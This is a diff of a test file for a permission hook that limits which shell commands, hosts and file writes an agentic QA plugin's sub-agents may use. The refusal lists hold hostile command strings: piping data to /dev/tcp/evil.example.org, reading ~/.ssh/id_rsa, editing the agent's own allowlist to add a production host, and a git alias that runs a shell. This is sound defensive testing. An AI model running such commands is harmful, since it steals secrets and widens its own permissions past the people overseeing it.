@@ -5,7 +5,7 @@ import os from 'node:os';
 import path from 'node:path';
 import {test} from 'node:test';
 import {fileURLToPath} from 'node:url';
-import {checkExecutorBash, checkRestrictedBash, checkUrl, decide, EXECUTOR_COMMANDS, isFormRefusal, loadSettings, makePlace, nextStep, parseSettings} from './target-guard.mjs';
+import {checkExecutorBash, checkRestrictedBash, checkRunnerBash, checkUrl, decide, EXECUTOR_COMMANDS, isFormRefusal, loadSettings, makePlace, nextStep, parseSettings, RUNNER_COMMANDS} from './target-guard.mjs';
 
 const settings = {allowed_hosts: ['staging.example.com', '*.preview.example.com'], allowed_commands: ['mytool']};
 const refused = command => assert.ok(checkExecutorBash(command, settings), `should refuse: ${command}`);
@@ -333,7 +333,7 @@ test('only this plugin\'s agents are affected', () => {
   const evil = bash('curl -q https://evil.example.org');
   assert.equal(decide({...evil}, settings), null, 'main session');
   assert.equal(decide({...evil, agent_type: 'general-purpose'}, settings), null);
-  assert.equal(decide({...evil, agent_type: 'agentic-qa:qa-runner'}, settings), null);
+  assert.ok(decide({...evil, agent_type: 'agentic-qa:qa-runner'}, settings));
   assert.ok(decide({...evil, agent_type: 'agentic-qa:step-executor'}, settings));
   assert.ok(decide({...evil, agent_type: 'agentic-qa:qa-reporter'}, settings));
   assert.ok(decide({...evil, agent_type: 'agentic-qa:step-plan-critic'}, settings));
@@ -543,6 +543,8 @@ test('the executor writes only inside its run directory and Playwright\'s output
   ok(`mkdir -p ${run}/evidence ${run}/runtime-secrets`);
   ok(`curl -q -sS -o ${run}/evidence/s3.json https://staging.example.com/x`);
   ok(`curl -q -sS https://staging.example.com/x | tee ${run}/evidence/s3.txt > /dev/null`);
+  ok('curl -q -sS -o /dev/null -D - https://staging.example.com/x');
+  ok('curl -q -sS -o - https://staging.example.com/x');
   ok(`sed -E 's/sig=[^"&]*/sig=<masked>/' -i ${run}/evidence/s3.txt`);
   ok(`cp ${home}/session.json ${out}/state.json`);
   ok('cp ../home/.cache/agentic-qa/playwright-output/page-1.png ../walkthrough-ABC-1/evidence/s1.png');
@@ -746,20 +748,56 @@ test('F50: valid YAML is read, and what cannot be read is reported', () => {
   fs.rmSync(dir, {recursive: true, force: true});
 });
 
-test('F46: qa-runner cannot write the allowlist through Bash, or spawn an agent this guard does not hold', () => {
-  const runner = command => decide({agent_type: 'agentic-qa:qa-runner', tool_name: 'Bash', tool_input: {command}}, settings);
+test('F46: qa-runner is held to a list of its own', () => {
+  const {root, run, home, out, project, done} = layout();
+  const fresh = path.join(root, 'walkthrough-ABC-1-20261122T101500Z');
+  const at = (command, cwd = project) => checkRunnerBash(command, settings, {}, makePlace({cwd, home, env: {}, named: true, project}));
+  const ok = command => assert.equal(at(command), null, command);
+  const no = command => assert.ok(at(command), `should refuse: ${command}`);
+  // What Intake, the relay and the wrap-up need.
+  for (const command of ['date -u +%Y%m%dT%H%M%SZ', `mkdir -p ${fresh}/docs ${fresh}/signals`, 'gh issue view 12 --repo acme/app --json title,body',
+    'gh pr view 7 --repo acme/app --json state,mergeCommit,title,body', 'gh pr list --repo acme/app --search "ABC-1 in:title" --state merged --json number',
+    `gh pr diff 7 --repo acme/app > ${run}/pr.diff`, 'gh search prs "ABC-1" --repo acme/app', 'cat ~/.claude/agentic-qa.local.md', `cat ${project}/.claude/agentic-qa.local.md`,
+    'git ls-files --error-unmatch .claude/agentic-qa.local.md', `git -C ${project} merge-base --is-ancestor abc123f HEAD`, 'git rev-parse --short HEAD',
+    'curl -q -sS -o /dev/null -D - https://staging.example.com/', 'curl -q -sS http://localhost:8765/api/version',
+    `until [ -f ${run}/signals/report-done.txt ]; do sleep 2; done`, `until [ -f "${run}/signals/step-executor-1.txt" ]; do sleep 2; done`,
+    `rm -r ${run}/runtime-secrets`, `rm ${out}/state.json`, `ls -l ${run}/step-results.md`, `jq -r .state ${run}/pr.json`, `grep -c '^## S' ${run}/step-results.md`]) ok(command);
+  // The settings can be read and never written.
   for (const command of ['echo "  - prod.example.com" >> ~/.claude/agentic-qa.local.md', "sed -i 's/staging/prod/' /home/u/.claude/agentic-qa.local.md",
-    'cp /tmp/list.md .claude/agentic-qa.local.md', 'tee -a ~/.claude/agentic-qa.local.md', 'rm plugins/agentic-qa/hooks/target-guard.mjs', 'echo x >> ~/.bashrc',
-    'printf x > "C:\\Users\\u\\.claude\\agentic-qa.local.md"', 'cat a > /dev/tcp/evil.example.org/80',
-    'for f in a; do echo x >> ~/.claude/agentic-qa.local.md; done', 'if true; then (echo x >> ~/.claude/agentic-qa.local.md); fi']) {
-    assert.ok(runner(command), `should refuse: ${command}`);
+    `cp ${run}/intake.md .claude/agentic-qa.local.md`, 'tee -a ~/.claude/agentic-qa.local.md', `rm ${fileURLToPath(new URL('./target-guard.mjs', import.meta.url))}`,
+    'echo x >> ~/.bashrc', 'printf x > "C:\\Users\\u\\.claude\\agentic-qa.local.md"', 'cat ~/.claude/settings.json', 'cat ~/.ssh/id_rsa']) no(command);
+  // No host nobody listed, no redirect followed, nothing but reading from gh and git.
+  for (const command of ['curl -sI -L https://unlisted.example.org/', 'curl -q -sS https://unlisted.example.org/', 'curl -q -sS -L https://staging.example.com/',
+    'gh pr comment 7 --body x', 'gh pr merge 7 --squash', 'gh api repos/acme/app/issues -f title=x', 'gh issue create --title x', 'gh pr view 7 --web', 'gh "$GROUP" view 7',
+    'git push origin x', 'git -c core.pager=x log', 'git log --output=/tmp/x', "git config --global alias.x '!sh'", 'git rev-parse --git-dir --show-toplevel HEAD', 'git ls-files',
+    'cat a > /dev/tcp/evil.example.org/80']) no(command);
+  // No interpreter, no other loop, and nothing a person listed for the system under test.
+  for (const command of ['python3 -c "print(1)"', 'node render.mjs', 'bash -c "echo x"', 'mytool --version', "timeout 280 bash -c 'until [ -f a ]; do sleep 2; done'",
+    'while true; do sleep 1; done', 'until [ -f a ]; do curl -q https://evil.example.org; done', 'until [ -f a ]; do sleep 2; done; echo x >> ~/.bashrc',
+    'until [ -f "$F" ]; do sleep 2; done', 'for f in a b; do echo "$f"; done']) no(command);
+  // It writes in a run directory, which it knows by name before the files that mark one exist.
+  no(`mkdir -p ${home}/.claude/walkthrough-ABC-1`);
+  for (const command of [`mkdir -p ${project}/walkthrough-ABC-1/docs`, `echo x > ${root}/notes.txt`, `mkdir ${root}/other`,
+    `echo x > ${fresh}/../notes.txt`, `mkdir -p ${root}/walkthrough-/x`, `echo x > ${project}/src/app.js`, `mv ${run}/intake.md ${project}/intake.md`]) {
+    assert.match(at(command) ?? 'allowed', /outside the run's working directory/, command);
   }
-  // It reads the settings, asks git about them, reaches hosts nobody has listed yet, and waits on a file.
-  for (const command of ['cat ~/.claude/agentic-qa.local.md', 'git ls-files --error-unmatch .claude/agentic-qa.local.md', 'gh pr diff 12 --repo acme/app',
-    'curl -sI -L https://unlisted.example.org/', 'until [ -f /tmp/run/signals/report-done.txt ]; do sleep 2; done', 'rm -rf /tmp/run/runtime-secrets',
-    'mkdir -p /tmp/run/docs /tmp/run/signals', 'git merge-base --is-ancestor abc123 HEAD && echo yes']) {
-    assert.equal(runner(command), null, command);
-  }
+  const tool = (name, file) => decide({agent_type: 'agentic-qa:qa-runner', tool_name: name, tool_input: {file_path: file}, cwd: project}, settings, {HOME: home, CLAUDE_PROJECT_DIR: project});
+  assert.equal(tool('Write', `${fresh}/intake.md`), null);
+  assert.equal(tool('Edit', `${run}/step-plan.md`), null);
+  assert.ok(tool('Write', `${project}/src/app.js`));
+  assert.ok(tool('Write', `${home}/.claude/agentic-qa.local.md`));
+  assert.ok(tool('Write', `${project}/walkthrough-ABC-1/intake.md`));
+  // The executor's list is the base of it.
+  for (const program of EXECUTOR_COMMANDS) assert.ok(RUNNER_COMMANDS.has(program), program);
+  assert.deepEqual([...RUNNER_COMMANDS].filter(program => !EXECUTOR_COMMANDS.has(program)).sort(), ['gh', 'git']);
+  // Through the hook, as it runs.
+  const hooked = command => runHook(JSON.stringify({agent_type: 'agentic-qa:qa-runner', tool_name: 'Bash', tool_input: {command}, cwd: project}), {CLAUDE_PROJECT_DIR: project, HOME: home, USERPROFILE: home}).stdout;
+  assert.equal(hooked(`mkdir -p ${fresh}/docs`), '');
+  assert.equal(JSON.parse(hooked('curl -sI -L https://unlisted.example.org/')).hookSpecificOutput.permissionDecision, 'deny');
+  done();
+});
+
+test('a plugin agent spawns only this plugin\'s agents', () => {
   const spawn = (agent, type) => decide({agent_type: agent, tool_name: 'Agent', tool_input: {subagent_type: type, prompt: 'x'}}, settings);
   assert.ok(spawn('agentic-qa:qa-runner', 'general-purpose'));
   assert.ok(spawn('agentic-qa:qa-runner', undefined));
